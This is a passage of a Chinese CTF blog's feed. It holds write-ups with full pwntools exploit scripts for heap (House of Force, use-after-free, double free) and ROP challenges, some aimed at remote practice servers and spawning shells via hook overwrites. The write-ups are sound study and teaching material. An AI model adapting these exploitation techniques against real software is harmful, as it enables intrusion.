sa(&#39;item&#39;,str(content))def free(id):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;item&#39;,str(id))def show(id):    sla(&#39;choice&#39;,&#39;1&#39;)def edit(id,size,content):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;item&#39;,str(id))    sla(&#39;item name&#39;,str(size))    sa(&#39;item&#39;,str(content))context.log_level = &#39;debug&#39;magic = 0x400d49add(0x30,&#39;chum&#39;)payload = &#39;a&#39; * 0x30 +p64(0) + p64(0xffffffffffffffff)edit(0,0x40,payload)size = -(0x40 + 0x20) - 0x10add(size,&#39; &#39;)payload = p64(0x400d49) + p64(0x400d49)add(0x10,payload)# sla(&#39;choice:&#39;,&#39;5&#39;)itr()</code></pre><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;local_file  = &#39;./gyctf_2020_force&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29457)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,date):    sla(&#39;2:puts&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    ru(&#39;bin addr 0x&#39;)    heapaddr = int(r(12),16)    info_addr(&#39;heapaddr&#39;,heapaddr)    sa(&#39;content&#39;,str(date))    return heapaddrpayload = 0x30 * &#39;a&#39; + p64(0) + p64(0xffffffffffffffff)libc_base = add(0x200000,&#39;111&#39;) + 0x200ff0info_addr(&#39;libc_base&#39;,libc_base)malloc_hook = libc_base + 0x3c4b10heapaddr = add(0x30,payload)size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8print(&#39;size----&gt;&#39;+hex(size))add(size,&#39;a&#39;)rce = rce16[1] + libc_basepayload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[&#39;__libc_realloc&#39;] + realloc[1])add(0x20,payload)sla(&#39;2:puts&#39;,&#39;1&#39;)sla(&#39;size&#39;,&#39;30&#39;)# dbg()itr()</code></pre><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>这个题是一个十分精妙的题，漏洞出现在程序初始化。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpy是以<code>\x00</code>来判断一个字符串是否结束的。<br>在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会<strong>把这个堆块的地址也给复制上去</strong>，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去<code>0xffffffff</code>,就可以改到top chunk的size位。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>leak堆块base</li><li>修改top chunk size</li><li>hof到heaplist处</li><li>给heaplist写上free got，用edit，修改其为puts</li><li>泄漏libc地址</li><li>修改free got 为system，然后指向<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timelocal_file  = &#39;./bcloud_bctf_2016&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27301)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def name(name):    sa(&#39;name&#39;,str(name))    ru(&#39;b&#39;)    heapbase = uu32(r(4)) - 0x8    info_addr(&#39;heapbase&#39;,heapbase)    return heapbasedef org(org,host):    sa(&#39;Org:&#39;,str(org))    sla(&#39;Host:&#39;,str(host))def add(size,content):    sla(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;length&#39;,str(size))    sa(&#39;content:&#39;,str(content))def edit(id,content):    sla(&#39;---&gt;&gt;&#39;,&#39;3&#39;)    sla(&#39;id&#39;,str(id))    sa(&#39;the new content&#39;,str(content))def free(id):    sla(&#39;-&gt;&#39;,&#39;4&#39;)    sla(&#39;id&#39;,str(id))context.log_level = &#39;debug&#39;sizelist = 0x804B0A0heaplist = 0x804B120heapbase = name(&#39;a&#39; * (0x40-1) + &#39;b&#39;)top = heapbase + 0xd8info_addr(&#39;top&#39;,top)org(&#39;b&#39;*0x40,p32(0xffffffff)) #chang top chunk sizesize = heaplist - top - 0x10add(size,&#39;\n&#39;)add(0x18,&#39;\n&#39;)payload = p32(0) + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;atoi&#39;])  +p32(0x804B128+4+4) + &#39;/bin/sh\x00&#39;edit(1,payload + &#39;\n&#39;)puts_plt = elf.plt[&#39;puts&#39;]edit(1,p32(puts_plt) + &#39;\n&#39;)free(2)io.recv(1)io.recv(1)atoi = uu32(r(4))info_addr(&#39;atoi&#39;,atoi)libc = LibcSearcher(&#39;atoi&#39;,atoi)libc_base = atoi - libc.dump(&#39;atoi&#39;)system = libc_base + libc.dump(&#39;system&#39;)info_addr(&#39;libc_base&#39;,libc_base)edit(1,p32(system) + &#39;\n&#39;)free(3)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Force&quot;&gt;&lt;a href=&quot;#House-of-Force&quot; class=&quot;headerlink&quot; title=&quot;House of Force&quot;&gt;&lt;/a&gt;House of Force&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="House系列" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(4th)</title>
    <link href="http://chumen77.xyz/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/04/25/DASCTF安恒月赛/</id>
    <published>2020-04-25T13:48:11.966Z</published>
    <updated>2020-06-27T16:24:40.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-pwn"><a href="#DASCTF安恒月赛-pwn" class="headerlink" title="DASCTF安恒月赛-pwn"></a>DASCTF安恒月赛-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开赛了，有点事情没打，晚上复现了一下。</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>程序很简单，经典栈溢出，rop利用即可。<br>但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，<br>调试发现：<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。<br>解决办法：还是加个ret，让栈对其即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./test&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc.so.6&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    # io = remote(&#39;node3.buuoj.cn&#39;,25390)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400823# : pop rdi ; retoffset = 136start = 0x4005C0ret = 0x0400768sla(&#39;how long is your name:&#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])# dbg()sla(&#39;s you name?&#39;,payload)ru(&#39;hello &#39;)read = uu64(r(6))info_addr(&#39;printf&#39;,read)libc_base = read - libc.symbols[&#39;read&#39;]info_addr(&#39;libc_base&#39;,libc_base)binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()system = libc_base + libc.sym[&#39;system&#39;]sla(&#39;how long is your name: &#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])# rec = 0x4f322 + libc_base# dbg()sla(&#39;s you name?&#39;,payload)itr()</code></pre><h2 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;flag = &#39;&#39;for i in range(26):    flag += chr((ord(s[i]) - 1) ^ 6)print(flag)</code></pre><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>直接爆破了。</p><pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]for i in range(128):    flag = &#39;&#39;    for j in range(38):        flag += chr(s[j] ^ i)    if flag[:4] == &#39;flag&#39;:        print(flag)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-pwn&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-pwn&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛-pwn&quot;&gt;&lt;/a&gt;DASCTF安恒月赛-pwn&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="rop" scheme="http://chumen77.xyz/tags/rop/"/>
    
      <category term="uaf" scheme="http://chumen77.xyz/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>uaf和double free</title>
    <link href="http://chumen77.xyz/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <id>http://chumen77.xyz/2020/04/25/uaf和double free/</id>
    <published>2020-04-25T03:40:09.709Z</published>
    <updated>2020-06-27T16:24:30.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="uaf和double-free"><a href="#uaf和double-free" class="headerlink" title="uaf和double free"></a>uaf和double free</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始打算入门堆，简单记录几道相关的题。</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>题目较为简单存在后门函数，利用uaf漏洞攻击即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./hacknote&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27892)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sl(&#39;1&#39;)    ru(&#39;Note size &#39;)    sl(str(size))    ru(&#39;Content :&#39;)    sl(str(content))def dele(index):    sl(&#39;2&#39;)    sl(str(index))def show(index):    sl(&#39;3&#39;)    sl(str(index))ru(&#39;Your choice :&#39;)add(16,&#39;aaaa&#39;)ru(&#39;Your choice :&#39;)add(16,&#39;bbbb&#39;)ru(&#39;Your choice :&#39;)dele(0)ru(&#39;Your choice :&#39;)dele(1)ru(&#39;Your choice :&#39;)add(8,p32(elf.symbols[&#39;magic&#39;]))ru(&#39;Your choice :&#39;)show(0)itr()</code></pre><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>题目有system函数，并且也有<code>/bin/sh\x00</code> ，当时在构造这个<code>/bin/sh\x00</code>的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_babyheap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1 if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27341)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;Your choice: &#39;,&#39;1&#39;)    sla(&#39;size: \n&#39;,str(size))    sa(&#39;content: \n&#39;,str(content)) def dele(index):    sla(&#39;: &#39;,&#39;2&#39;)    sla(&#39;index: \n&#39;,str(index))def show(index):    sla(&#39;: &#39;,&#39;3&#39;)    sla(&#39;index: \n&#39;,str(index))add(32,&#39;aaaaaaaa&#39;) #0add(32,&#39;bbbbbbbb&#39;) #1dele(0)dele(1)binsh = 0x602010add(16,flat(binsh,elf.plt[&#39;system&#39;]))# dbg()show(0)itr()</code></pre><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。<br>改<code>__free_hook</code>为system即可。<code>__free_hook</code>的参数正好是堆块的date，较好控制。<br>（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。）</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_message&#39;# local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;# remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1if debug:    io = process(local_file)    # libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25390)    # libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(length,contend) :    sla(&#39;choice: &#39;,&#39;1&#39;)    sla(&#39;length of message:\n&#39;,str(length))    sa(&#39;message:\n&#39;,str(contend))def free(index):    sla(&#39;choice: &#39;,&#39;2&#39;)    sla(&#39;to delete:\n&#39;,str(index))def edit(index,contend):    sla(&#39;choice: &#39;,&#39;3&#39;)    sla(&#39;to edit:\n&#39;,str(index))    sa(&#39;the message:\n&#39;,str(contend))def show(index):    sla(&#39;choice: &#39;,&#39;4&#39;)    sla(&#39;to display:\n&#39;,str(index))add(0x30,&#39;a&#39;) #0add(0x20,&#39;a&#39;) #1add(0x20,&#39;a&#39;) #2free(1)free(2)free(1)add(0x20,p64(0x602068))add(0x20,&#39;aaaaaaaa&#39;)add(0x20,&#39;aaaaaaaa&#39;)contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;])add(0x20,contend)show(0)ru(&#39; message: &#39;)puts = uu64(r(6))libc_base = puts - libc.symbols[&#39;puts&#39;]free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]print(&#39;puts&#39; + hex(puts))print(&#39;libc_base&#39; + hex(libc_base))system = libc_base + libc.symbols[&#39;system&#39;]contend = p64(free_hook)dbg()edit(6,contend)# dbg()contend = p64(system)edit(0,contend)# dbg()add(0x8,&#39;/bin/sh\x00&#39;)free(7)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;uaf和double-free&quot;&gt;&lt;a href=&quot;#uaf和double-free&quot; class=&quot;headerlink&quot; title=&quot;uaf和double free&quot;&gt;&lt;/a&gt;uaf和double free&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>pwntools的gdb.attach</title>
    <link href="http://chumen77.xyz/2020/04/20/pwntools%E7%9A%84gdb.attach/"/>
    <id>http://chumen77.xyz/2020/04/20/pwntools的gdb.attach/</id>
    <published>2020-04-20T04:21:15.070Z</published>
    <updated>2020-07-16T13:15:04.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntools的gdb-attach"><a href="#pwntools的gdb-attach" class="headerlink" title="pwntools的gdb.attach"></a>pwntools的gdb.attach</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在尝试学着更快的调试exp，很早就了解到这个gdb.attach，但是本人是ssh连上去的，根本用不了。然后尝试tmux这个神器，来实现gdb.attach。成功以后发现一个不好的点，pwntools gdb.attach上的gdb调试中，很多函数是没有符号表的，调试起来反而难度增加。<br><img src="http://qiqianyun.chumen77.xyz/uPic/QGWqDH.png" srcset="/img/loading.gif" alt><br>自己手动gdb.attach上去。<br><img src="http://qiqianyun.chumen77.xyz/uPic/acimnJ.png" srcset="/img/loading.gif" alt><br>然后发现谷歌也谷歌不出来，就来折腾源码了。<br><strong>版本号 ：pwntools (4.0.1)</strong></p><h2 id="改善"><a href="#改善" class="headerlink" title="改善"></a>改善</h2><p>因为正常本人都是</p><pre><code>chumen77@chumen-77:~$ gdb at pid</code></pre><p>这样来进行attach。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JxHuUC.png" srcset="/img/loading.gif" alt><br>发现用pwntools时候，它进行的命令是这样的，然后思路就来了找到相关源码，改一下就好了。</p><h3 id="找关键处"><a href="#找关键处" class="headerlink" title="找关键处"></a>找关键处</h3><pre><code>/running in new terminal</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8T9BqG.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BlYHnW.png" srcset="/img/loading.gif" alt><br>删除2行和修改一行代码（<code>-q 改成 at</code>）即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XUD2ZW.png" srcset="/img/loading.gif" alt><br>发现已经可以了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwntools的gdb-attach&quot;&gt;&lt;a href=&quot;#pwntools的gdb-attach&quot; class=&quot;headerlink&quot; title=&quot;pwntools的gdb.attach&quot;&gt;&lt;/a&gt;pwntools的gdb.attach&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>Ropemporium 通关记录</title>
    <link href="http://chumen77.xyz/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/13/Ropemporium通关记录/</id>
    <published>2020-04-13T04:32:06.614Z</published>
    <updated>2020-08-02T15:30:06.189Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-通关记录"><a href="#Ropemporium-通关记录" class="headerlink" title="Ropemporium 通关记录"></a>Ropemporium 通关记录</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。</p><pre><code class="c">int ret2win(){  printf(&quot;Thank you! Here&#39;s your flag:&quot;);  return system(&quot;/bin/cat flag.txt&quot;);}</code></pre><p>并且存在漏洞函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./ret2win32&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 44 + p32(0x08048659)io.sendline(payload)io.interactive()</code></pre><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./ret2win&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(0x00000400811)io.sendline(payload)io.interactive()</code></pre><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int usefulFunction(){  return system(&quot;/bin/ls&quot;);}</code></pre><p>后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./split32&#39;)key = 0x0804A030 # /bin/cat flag.txt&#39;io.recvuntil(&#39;&gt;&#39;)offset = 44payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./split&#39;)io.recvuntil(&#39;&gt;&#39;)key = 0x00601060 # /bin/cat flag.txt&#39;offset = 40pop_rdi_ret = 0x0000000000400883payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload)io.interactive()</code></pre><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn usefulFunction(){  callme_three(4LL, 5LL, 6LL);  callme_two(4LL, 5LL, 6LL);  callme_one(4LL, 5LL, 6LL);  exit(1);}</code></pre><p>这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" 